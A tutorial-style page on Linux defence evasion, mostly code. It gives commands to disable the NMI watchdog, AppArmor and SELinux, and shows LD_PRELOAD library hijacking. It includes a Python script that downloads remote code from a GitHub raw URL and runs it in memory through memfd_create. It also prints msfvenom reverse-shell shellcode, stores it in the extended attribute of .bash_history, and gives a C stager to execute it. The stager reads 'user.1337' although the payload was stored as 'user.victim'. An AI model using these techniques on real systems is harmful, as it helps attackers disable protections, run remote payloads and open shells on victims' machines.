# Linux Evasive Techniques:

## Disabling Interrupts:

Attackers also used the commands to disable non-maskable Interrupt(nmi).Watchdog is
basically a configurable timer mechanism which generates interrupt at a particular given
condition and time.In case of the system freeze, the nmi watchdog interrupt handler would
kill the task which is responsible for the system freeze.To evade this defense mechanism,
attackers disable watchdog feature using sysctl command or temporarily disabling it by
setting the value to ‘0’.

Check Current Watchdog Settings:

```
sysctl -a | grep watchdog
```

Disable Watchdog:

```
sudo sysctl kernel.watchdog=0
echo '0' > /proc/sys/kernel/nmi_watchdog
echo "kernel.watchdog=0" | sudo tee -a /etc/sysctl.conf
```

## Disabling Linux Security Modules:

The malicious shell script also disables Linux security modules like SElinux, Apparmor.
These modules are designed to implement mandatory access control(MAC) policies. A server
administrator could simply configure these modules to provide the users restricted access to
the installed or running applications in the system.

---

AppArmour is a security feature in linux which is used to lock down applications like firefox
for increased security. A user can restrict an application in Ubuntu’s default configuration by
giving limited permission to a certain application.

```
sudo systemctl stop apparmor
sudo systemctl disable apparmor
service apparmor stop
```

SElinux is another security feature in linux systems by which a security administrator could
apply security context on certain applications and utilities. On some web servers the shell is
disabled or restricted so for RCE(Remote Code Execution) adversaries usually bypass/disable
this:

```
setenforce 0
echo SELINUX=disabled > /etc/selinux/config
```

## Hijacking Libraries with `LD_PRELOAD`

The `LD_PRELOAD` environment variable allows attackers to load a malicious shared object (SO) file before any other library during program execution. This can be used to override system functions, such as `malloc()`, with custom implementations, enabling malicious behavior.

For example, to execute the `ls` command with a custom implementation of `malloc()`, an attacker would run:

```sh
LD_PRELOAD=/path/to/my/malloc.so /bin/ls
```

In this case, `/path/to/my/malloc.so` is a custom shared object that will replace the default implementation of `malloc()` (or any other overridden functions). This technique is commonly used for data exfiltration, logging sensitive information, or bypassing security mechanisms.

## Using Syscall() for Obfuscation/Fileless Activity

This script downloads content from a GitHub raw URL, writes it to an in-memory file descriptor created with `memfd_create`, reads it back, and executes it as Python code. The entire process happens in RAM without any filesystem operations.

```python
import ctypes
import os
import urllib.request

# Load libc and get syscall function
libc = ctypes.CDLL(None)
syscall = libc.syscall

# memfd_create syscall number (319 on x86_64)
SYS_MEMFD_CREATE = 319
MFD_CLOEXEC = 1

def download_and_execute_from_github(github_raw_url):
    """
    Download a Python script from GitHub and execute it in memory
    without writing to disk.
    """
    # Download the script content
    print(f"Downloading from {github_raw_url}")
    with urllib.request.urlopen(github_raw_url) as response:
        script_content = response.read()
    
    # Create an anonymous file in memory
    fd = syscall(SYS_MEMFD_CREATE, b"", MFD_CLOEXEC)
    if fd < 0:
        raise OSError("memfd_create failed")
    
    print(f"Created memfd with fd={fd}")
    
    # Write the downloaded content to the memory file
    os.write(fd, script_content)
    
    # Seek back to the beginning to read it
    os.lseek(fd, 0, os.SEEK_SET)
    
    # Read the content back
    code_bytes = os.read(fd, len(script_content))
    
    # Close the fd since we've read what we need
    os.close(fd)
    
    # Compile and execute the Python code
    code_string = code_bytes.decode('utf-8')
    compiled_code = compile(code_string, '<memfd>', 'exec')
    
    print("Executing downloaded script...")
    exec(compiled_code)

if __name__ == "__main__":
    # Replace this with your actual GitHub raw URL
    github_url = "https://raw.githubusercontent.com/username/repo/main/script.py"
        
    download_and_execute_from_github(github_url)
```

## Abusing Extended Attributes

Create a simple payload:

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 -b '\x00' -f bash
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of bash file: 533 bytes
export buf=\
$'\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef'\
$'\xff\xff\xff\x48\xbb\x87\x22\xe0\xd6\x4b\x28\x0d\x73\x48'\
$'\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xed\x0b\xb8'\
$'\x4f\x21\x2a\x52\x19\x86\x7c\xef\xd3\x03\xbf\x45\xca\x85'\
$'\x22\xf5\x65\x34\x28\x0d\x72\xd6\x6a\x69\x30\x21\x38\x57'\
$'\x19\xad\x7a\xef\xd3\x21\x2b\x53\x3b\x78\xec\x8a\xf7\x13'\
$'\x27\x08\x06\x71\x48\xdb\x8e\xd2\x60\xb6\x5c\xe5\x4b\x8e'\
$'\xf9\x38\x40\x0d\x20\xcf\xab\x07\x84\x1c\x60\x84\x95\x88'\
$'\x27\xe0\xd6\x4b\x28\x0d\x73'
```

Store the bytes in the extended attributes of a file:

```sh
setfattr --name=user.victim --value="$buf" .bash_history
```

Now the contents of the shellcode are stored in the user extended attribute called “victim” of the file `.bash_history`.

```sh
getfattr --encoding=hex --dump .bash_history

# file: .bash_history
user.victim=0x4831c94881e9f6ffffff488d05efffffff48bb8722e0d64b280d7348315827482df8ffffffe2f4ed0bb84f212a5219867cefd303bf45ca8522f56534280d72d66a693021385719ad7aefd3212b533b78ec8af7132708067148db8ed260b65ce54b8ef938400d20cfab07841c6084958827e0d64b280d73
```

We can read and execute the extended file attribute which launches the reverse shell.

```c
#include <stdio.h>
#include <sys/xattr.h>

// gcc -fno-stack-protector -z execstack stager.c

int main() {
    const char *file_path = "/home/siren/.bash_history";
    const char *attr_name = "user.1337";
    char attr_value[119];
    ssize_t ret;

    ret = getxattr(file_path, attr_name, attr_value, sizeof(attr_value));
    if (ret == -1) {
        perror("getxattr");
        return 1;
    }

    int (*func)();
    func = (int (*)()) attr_value;
    (int)(*func)();
}
```

By default, extended attributes are not preserved by `tar`, `cp`, `rsync`, and other similar programs.

Source: [Kernal](https://kernal.eu/about/)
